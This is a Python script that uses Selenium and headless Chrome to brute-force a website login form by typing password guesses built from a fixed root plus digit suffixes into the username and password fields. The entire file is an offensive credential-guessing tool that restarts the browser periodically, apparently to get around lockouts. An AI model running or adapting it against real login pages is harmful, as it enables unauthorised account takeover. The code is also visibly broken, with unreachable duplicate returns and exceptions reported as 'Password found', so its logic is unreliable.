from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import itertools
import string
import time
import sys

def initialize_driver(URL):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)
    driver.get(URL)
    driver.delete_all_cookies()
    return driver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    return webdriver.Chrome(options=options)
    return webdriver.Chrome()

def find_email_field(driver):
    return driver.find_element(By.CSS_SELECTOR, '#form_username')

def find_password_field(driver):
    return driver.find_element(By.CSS_SELECTOR, '#form_password')
    return WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, '#form_password'))
    )

def find_submit_button(driver):
    return driver.find_element(By.CSS_SELECTOR, '#form_submit')
    return WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, '#form_submit'))
    )

start_time = time.time()

def compare_strings(str1, str2):
    if len(str1) < len(str2):
        return -1
    elif len(str1) > len(str2):
        return 1

    for i in range(len(str1)):
        if str1[i] < str2[i]:
            return -1
        elif str1[i] > str2[i]:
            return 1

    return 0

def attack(URL, email_value, root, first_password, character_set, length):
    max_attempts_before_restart = len(character_set) ** 3
    try:
        driver = initialize_driver(URL=URL)
        
        password_attempts = 0

        last_password = root + first_password

        for suffix_length in range(length + 1):
            for suffix_tuple in itertools.product(character_set, repeat=suffix_length):
                suffix = ''.join(suffix_tuple)
                password = f"{root}{suffix}"

                if compare_strings(password, first_password) >= 0:
                    if password_attempts % max_attempts_before_restart == 0:
                        driver.quit()
                        driver = initialize_driver(URL=URL)
                        print(f"---------------------------------------- Password Attempts: {password_attempts} ---------------------------------------- ")
                        email_field = find_email_field(driver)
                        email_field.send_keys(email_value)
                        
                        password_field = find_password_field(driver)
                        password_field.clear()
                        password_field.send_keys(last_password)

                        submit_button = find_submit_button(driver)
                        submit_button.click()

                        end_time = time.time()
                    
                        time_taken = end_time - start_time

                        print(f"URL: {URL} - User ID: {email_value} - Login password: {last_password} - Time: {time_taken:.2f} seconds")

                    password_field = find_password_field(driver)
                    password_field.clear()
                    password_field.send_keys(password)

                    submit_button = find_submit_button(driver)
                    submit_button.click()

                    password_attempts += 1
                    end_time = time.time()
                    time_taken = end_time - start_time

                    last_password = password

                    print(f"URL: {URL} - User ID: {email_value} - Login password: {password} - Time: {time_taken:.2f} seconds")

    except Exception as e:
        print(f"Password found: {last_password}")
    finally:
        if 'driver' in locals():
            driver.quit()

if not attack('https://example.com/login', "Username", "PasswordRoot", "9999", string.digits, 4):
    print("Password found or error. Stopping the program.")
    sys.exit(1)
